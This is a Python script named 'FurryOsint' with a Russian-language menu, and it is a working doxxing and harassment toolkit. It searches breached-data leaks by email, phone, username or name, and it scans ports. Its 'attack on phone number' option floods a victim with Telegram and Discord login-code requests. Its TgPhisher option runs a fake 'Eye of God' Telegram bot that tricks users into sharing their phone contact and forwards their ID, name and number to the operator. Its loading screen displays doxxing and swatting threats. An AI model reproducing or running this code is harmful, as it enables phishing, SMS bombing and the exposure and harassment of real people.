import requests
import os
import json
from colorama import init, Fore, Style
import socket
from faker import Faker
import time
import sys
from pathlib import Path
import telebot
from telebot import types

init(autoreset=True)

API_URL = "https://server.leakosint.com/"
CONFIG_FILE = Path(os.path.expanduser("~/.FurryOsint_config.json"))
fake = Faker()

BANNER = f"""
{Fore.BLUE}{Style.BRIGHT.center(80)}
        
          █████▒█    ██  ██▀███   ██▀███ ▓██   ██▓
        ▓██   ▒ ██  ▓██▒▓██ ▒ ██▒▓██ ▒ ██▒▒██  ██▒
        ▒████ ░▓██  ▒██░▓██ ░▄█ ▒▓██ ░▄█ ▒ ▒██ ██░
        ░▓█▒  ░▓▓█  ░██░▒██▀▀█▄  ▒██▀▀█▄   ░ ▐██▓░
        ░▒█░   ▒▒█████▓ ░██▓ ▒██▒░██▓ ▒██▒ ░ ██▒▓░
         ▒ ░   ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░  ██▒▒▒ 
         ░     ░░▒░ ░ ░   ░▒ ░ ▒░  ░▒ ░ ▒░▓██ ░▒░ 
         ░ ░    ░░░ ░ ░   ░░   ░   ░░   ░ ▒ ▒ ░░  
         ▒█████  ░ ██████ ░██▓ ███▄ ░  █ ░███████▓
        ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒
        ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░
        ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ 
        ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ 
        ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   
          ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░    
        ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░      
            ░ ░        ░   ░           ░            
"""

MENU = f"""
{Fore.BLUE}{Style.BRIGHT.center(80)}
{Fore.BLUE}               ╔═════════════════════════════════════╗
{Fore.BLUE}               ║ {Fore.BLUE}1. {Fore.BLUE}Поиск утечек по email            {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}2. {Fore.BLUE}Поиск утечек по юзернейму        {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}3. {Fore.BLUE}Поиск утечек по телефону         {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}4. {Fore.BLUE}Поиск по IP                      {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}5. {Fore.BLUE}Генерация случайных данных       {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}6. {Fore.BLUE}Поиск по домену                  {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}7. {Fore.BLUE}Сканер портов                    {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}8. {Fore.BLUE}Поиск по MAC-адресу              {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}9. {Fore.BLUE}Атака на номер телефона          {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}10. {Fore.BLUE}TgPhisher (ГлазБога)            {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}11. {Fore.BLUE}Поиск по любым данным           {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}12. {Fore.BLUE}Выход                           {Fore.BLUE}║
{Fore.BLUE}               ║ {Fore.BLUE}13. {Fore.BLUE}Выход из аккаунта               {Fore.BLUE}║
{Fore.BLUE}               ╚═════════════════════════════════════╝
"""

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as file:
        json.dump(config, file)

def search_leaks(request, token, limit=1000):
    data = {
        "token": token,
        "request": request,
        "limit": limit
    }
    try:
        response = requests.post(API_URL, json=data)
        response.raise_for_status()
        return handle_response(response)
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Ошибка: {e}")
        return {"error": "Запрос не удался"}

def handle_response(response):
    if response.status_code == 200:
        return response.json()
    else:
        return {"error": response.status_code, "message": response.text}

def print_leak_info(leak_info):
    if 'NumOfResults' in leak_info and leak_info['NumOfResults'] > 0:
        for source, details in leak_info['List'].items():
            print(f"{Fore.CYAN}Источник: {Fore.BLUE}{source}")
            for record in details['Data']:
                if isinstance(record, dict):
                    for key, value in record.items():
                        if key != 'InfoLeak':
                            print(f"{Fore.CYAN}  - {key}: {Fore.BLUE}{value}")
    else:
        print(f"{Fore.RED}Результаты не найдены.")

def print_leak_info(leak_info):
    if 'NumOfResults' in leak_info and leak_info['NumOfResults'] > 0:
        for source, details in leak_info['List'].items():
            print(f"{Fore.CYAN}Источник: {Fore.BLUE}{source}")
            for record in details['Data']:
                if isinstance(record, dict):
                    for key, value in record.items():
                        if key != 'InfoLeak':
                            print(f"{Fore.CYAN}  - {key}: {Fore.BLUE}{value}")
    else:
        print(f"{Fore.RED}Результаты не найдены.")
def search_by_ip(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        data = response.json()
        for key, value in data.items():
            print(f"{Fore.CYAN}{key.capitalize()}: {Fore.BLUE}{value}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Ошибка: {e}")

def logout_and_delete_config():
    try:
        CONFIG_FILE.unlink()
        print(f"{Fore.RED}Файл конфигурации удален. Выход из аккаунта...")
    except FileNotFoundError:
        print(f"{Fore.RED}Файл конфигурации не найден. Выход из аккаунта...")
    except Exception as e:
        print(f"{Fore.RED}Произошла ошибка при удалении файла конфигурации: {e}")
    exit()

def generate_random_data():
    print(f"{Fore.CYAN}Имя: {Fore.BLUE}{fake.name()}")
    print(f"{Fore.CYAN}Адрес: {Fore.BLUE}{fake.address()}")
    print(f"{Fore.CYAN}Email: {Fore.BLUE}{fake.email()}")
    print(f"{Fore.CYAN}Телефон: {Fore.BLUE}{fake.phone_number()}")
    print(f"{Fore.CYAN}Кредитная карта: {Fore.BLUE}{fake.credit_card_full()}")
    print(f"{Fore.CYAN}Пароль: {Fore.BLUE}{fake.password()}")

def search_by_domain(domain):
    try:
        response = requests.get(f"https://api.domainsdb.info/v1/domains/search?domain={domain}")
        response.raise_for_status()
        data = response.json()
        if 'domains' in data:
            for domain_info in data['domains']:
                for key, value in domain_info.items():
                    print(f"{Fore.CYAN}{key.capitalize()}: {Fore.BLUE}{value}")
        else:
            print(f"{Fore.RED}Информация по домену не найдена.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Ошибка: {e}")

def port_scanner(ip, start_port, end_port):
    print(f"{Fore.CYAN}Сканирование портов {start_port}-{end_port} на {ip}...")
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"{Fore.BLUE}Порт {port}: Открыт")
        else:
            print(f"{Fore.RED}Порт {port}: Закрыт")
        sock.close()

def search_by_mac(mac):
    try:
        response = requests.get(f"https://api.macvendors.com/{mac}")
        response.raise_for_status()
        print(f"{Fore.CYAN}Производитель: {Fore.BLUE}{response.text}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Ошибка: {e}")

def perform_attack(phone_number, num_rounds):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Content-Type': 'application/x-www-form-urlencoded'}
    rounds = 0
    try:
        for _ in range(num_rounds):
            time.sleep(1)
            try:
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number})
                requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': phone_number})
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number})
                requests.get('https://telegram.org/support?setln=ru', headers=headers)
                requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': phone_number})
                requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={"phone": phone_number})
                rounds += 1
                print(Fore.WHITE + "[INFO] Запрос успешно отправлен")
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Ошибка запроса: {e}")
    except Exception as e:
        print(Fore.RED + f"Произошла ошибка: {e}")

def animated_print(text, speed=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()  # Для новой строки после завершения анимации

def loading_animation(duration=5):
    symbols = " error error error                ", "error                ", "proxit?           ","Dox everyone          ","Furry Community         ", "FYRNIK               ", "FurryOsint       ", "By Fyrnik        ", "By Furries ", "Dox Me..    ", "▓▓Load?▓▓▓▓         ", "Loading?        ", "Wha..ЧТо?         ", "FurryOsint        ", "ʇuısoʎɹɹпɟ       ", " ", "DOXXED BY...      ""Жди сват       ", "Задоксь меня               ", "Попробуй найди меня           ", "опера уже едут              ", "Ты раб          ", "Жди докс сука            ", "Последний понедельник живешь!      " #"|/-\\"
    end_time = time.time() + duration
    while time.time() < end_time:
        for symbol in symbols:
            sys.stdout.write(f"\r        {Fore.BLUE}... {symbol} ...")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r")

def tgphisher():
    def is_valid_token(token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    token = input(f"     {Fore.BLUE}Введите токен вашего бота >> ")
    admin_id = input(f"Айди можно получить через бота: {Fore.BLUE}@get_myidbot\n     {Fore.BLUE}Введите ваш Telegram ID >> ")

    if not is_valid_token(token):
        print("{Fore.RESET}     Неверный токен! Перезапустите скрипт")

    else:
        def get_bot_username(token):
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url).json()
        
            if response.get("ok") and 'username' in response.get("result", {}):
                return response["result"]["username"]
            else:
                return None

        username = get_bot_username(token)
        if username:
            clear_screen()
            print(f'''
{Style.BRIGHT}{Fore.BLUE}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{Style.RESET_ALL}           
                    .:EYE OF GOD:.    
           {Style.BRIGHT}{Fore.BLUE}Telegram{Style.RESET_ALL}:{Fore.CYAN} t.me/Fyrnik_osinter

      ''')
            print(f"        Бот запущен!{Style.RESET_ALL} - {Fore.RED}для выхода [ctrl + c]{Style.RESET_ALL}\n        Ваше имя бота: {Fore.BLUE}@{username}{Style.RESET_ALL}\n        Отправьте команду {Fore.BLUE}- /start{Style.RESET_ALL} боту.")
        else:
            print(f"\n     Бот запущен!{Style.RESET_ALL} - {Fore.RED}для выхода [ctrl + c]{Style.RESET_ALL}")
        bot = telebot.TeleBot(token)
        @bot.message_handler(commands=['start'])
        def send_welcome(message):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            button_phone = types.KeyboardButton(text="Подтвердить номер телефона", request_contact=True)
            markup.add(button_phone)
        
            bot.send_message(message.chat.id, """
🗂 <b>Номер телефона</b>

Вам необходимо подтвердить <b>номер телефона</b> для того, чтобы завершить <b>идентификацию</b>.

Для этого нажмите кнопку ниже.""", parse_mode="HTML", reply_markup=markup)

        @bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.contact is not None:
                if message.contact.user_id == message.from_user.id:
                    markup = types.ReplyKeyboardRemove()
                    bot.send_message(message.chat.id, f'''
⬇️ **Примеры команд для ввода:**

👤 **Поиск по имени**
├  `Блогер` (Поиск по тегу)
├  `Антипов Евгений Вячеславович`
└  `Антипов Евгений Вячеславович 05.02.1994`
 (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

🚗 **Поиск по авто**
├  `Н777ОН777` - поиск авто по РФ
└  `WDB4632761X337915` - поиск по VIN

👨 **Социальные сети**
├  `instagram.com/ev.antipov` - Instagram
├  `vk.com/id577744097` - Вконтакте
├  `facebook.com/profile.php?id=1` - Facebook
└  `ok.ru/profile/162853188164` - Одноклассники

📱 `79999939919` - для поиска по номеру телефона
📨 `tema@gmail.com` - для поиска по Email
📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

🏛 `/company Сбербанк` - поиск по юр лицам
📑 `/inn 784806113663` - поиск по ИНН
🎫 `/snils 13046964250` - поиск по СНИЛС
📇 `/passport 6113825395` - поиск по паспорту
🗂 `/vy 9902371011` - поиск по ВУ

📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
🙂 Отправьте стикер, чтобы найти создателя.
🌎 Отправьте точку на карте, чтобы найти информацию.
🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

''', parse_mode="Markdown", reply_markup=markup)
                    try:
                        bot.send_message(admin_id, f'''
#TgPhisher - {username}
#CyberOsint - @cyb3r_st4lk3r 
- {message.from_user.id}
- {message.from_user.first_name}
- {message.from_user.username}
- {message.contact.phone_number}
- Попробуй по этим данным совершить поиск в нашем софте или боте!''')
                    except:
                        print('     ошибка отправки на ADMIN_ID      ')
                else:
                        bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")

        @bot.message_handler(func=lambda message: True)
        def default_handler(message):
            bot.send_message(message.chat.id, f'''
⚠️ **Технические работы.**

Работы будут завершены в ближайший промежуток времени, все подписки наших пользователей продлены.
''', parse_mode="Markdown")
      
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Произошла ошибка: {e}")

def main():
    clear_screen()
    config = load_config()

    if 'name' in config and 'token' in config:
        name = config['name']
        token = config['token']
        animated_print("""
        
          █████▒█    ██  ██▀███   ██▀███ ▓██   ██▓
        ▓██   ▒ ██  ▓██▒▓██ ▒ ██▒▓██ ▒ ██▒▒██  ██▒
        ▒████ ░▓██  ▒██░▓██ ░▄█ ▒▓██ ░▄█ ▒ ▒██ ██░
        ░▓█▒  ░▓▓█  ░██░▒██▀▀█▄  ▒██▀▀█▄   ░ ▐██▓░
        ░▒█░   ▒▒█████▓ ░██▓ ▒██▒░██▓ ▒██▒ ░ ██▒▓░
         ▒ ░   ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░  ██▒▒▒ 
         ░     ░░▒░ ░ ░   ░▒ ░ ▒░  ░▒ ░ ▒░▓██ ░▒░ 
         ░ ░    ░░░ ░ ░   ░░   ░   ░░   ░ ▒ ▒ ░░  
         ▒█████  ░ ██████ ░██▓ ███▄ ░  █ ░███████▓
        ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒
        ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░
        ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ 
        ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ 
        ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   
          ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░    
        ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░      
            ░ ░        ░   ░           ░            
                       ::Telegram - @Fyrnik_osinter::
                                                           
""", speed=0.002)
        animated_print(f"\n     С возвращением, {name}!", speed=0.05)
    else:
        name = input(f"Введите ваше имя: ")
        animated_print('Получите api-key из бота - t.me/FURRY_OS1NT', speed=0.05)
        token = input(f"Введите ваш токен: ")
        config['name'] = name
        config['token'] = token
        save_config(config)
        clear_screen()
    loading_animation(duration=4)
    
    while True:
        clear_screen()
        print(BANNER)
        print(MENU)
        choice = input(f"{Fore.CYAN}Введите ваш выбор: {Fore.BLUE}")
        clear_screen()
        print(BANNER)
        if choice.isdigit() and 1 <= int(choice) <= 13:
            choice = int(choice)
            if choice == 1:
                email = input(f"{Fore.CYAN}Введите email: {Fore.BLUE}")
                limit = input(f"{Fore.CYAN}Введите лимит (100-10000, по умолчанию 1000(enter)): {Fore.BLUE}") or 1000
                limit = int(limit)
                result = search_leaks(email, token, limit)
                print_leak_info(result)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 2:
                username = input(f"{Fore.CYAN}Введите имя пользователя: {Fore.BLUE}")
                limit = input(f"{Fore.CYAN}Введите лимит (100-10000, по умолчанию 1000(enter)): {Fore.BLUE}") or 1000
                limit = int(limit)
                result = search_leaks(username, token, limit)
                print_leak_info(result)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 3:
                phone = input(f"{Fore.CYAN}Введите телефон: {Fore.BLUE}")
                limit = input(f"{Fore.CYAN}Введите лимит (100-10000, по умолчанию 1000(enter)): {Fore.BLUE}") or 1000
                limit = int(limit)
                result = search_leaks(phone, token, limit)
                print_leak_info(result)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 4:
                ip = input(f"{Fore.CYAN}Введите IP-адрес: {Fore.BLUE}")
                search_by_ip(ip)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 5:
                generate_random_data()
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 6:
                domain = input(f"{Fore.CYAN}Введите домен: {Fore.BLUE}")
                search_by_domain(domain)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 7:
                ip = input(f"{Fore.CYAN}Введите IP-адрес: {Fore.BLUE}")
                start_port = int(input(f"{Fore.CYAN}Введите начальный порт: {Fore.BLUE}"))
                end_port = int(input(f"{Fore.CYAN}Введите конечный порт: {Fore.BLUE}"))
                port_scanner(ip, start_port, end_port)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 8:
                mac = input(f"{Fore.CYAN}Введите MAC-адрес: {Fore.BLUE}")
                search_by_mac(mac)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 9:
                phone = input(f"{Fore.CYAN}Введите номер телефона для атаки: {Fore.BLUE}")
                num_rounds = int(input(f"{Fore.CYAN}Введите количество кругов: {Fore.BLUE}"))
                perform_attack(phone, num_rounds)
                input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 10:
                tgphisher()
            elif choice == 11:
                 name = input(f"\n Т\n{Fore.CYAN}Кого ищем? : {Fore.BLUE}")
                 limit = int(1000)
                 result = search_leaks(name, token, limit)
                 print_leak_info(result)
                 input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")
            elif choice == 12:
                print(f"{Fore.RED}Выход...")
                break
            elif choice == 13:
                logout_and_delete_config()
        else:
            print(f"{Fore.RED}Неверный выбор, попробуйте снова.")
            input(f"\n{Fore.CYAN}Нажмите Enter для возврата в меню >> ")

if __name__ == "__main__":
    main()
